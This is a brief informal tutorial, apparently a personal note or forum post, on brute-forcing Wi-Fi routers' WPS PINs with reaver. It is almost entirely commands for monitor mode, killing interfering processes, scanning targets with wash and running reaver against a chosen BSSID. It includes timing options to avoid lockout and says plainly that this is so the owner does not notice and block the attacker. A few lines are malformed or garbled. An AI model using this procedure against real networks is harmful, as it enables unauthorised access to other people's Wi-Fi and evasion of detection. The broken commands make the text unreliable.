Brute forcing wps pins with reaver

ifconfig wlan0 down

iwconfig mode monitor

ifconfig wlan0 up

airmon-ng check wlan0

airmon-ng check kill

airmon-ng check wlan0

wash -i wlan0mon

if u face any trouble just type : mkdir /etc/reaver/

Take a look at (wps locked) if says no means that we can proceed atacking

after finding your target u can stop scanning

reaver -b (enter the bssid) -i wlan0mon -c 6 -vv

^c      -vv     n

u can also search your target bssid and know more about it

because when u brute-force through wps the router may lock for a certain amount of time

and if somebody notice can block you

reaver -i wlan0 -b (enter the bssid) -c 6 -r 2:60
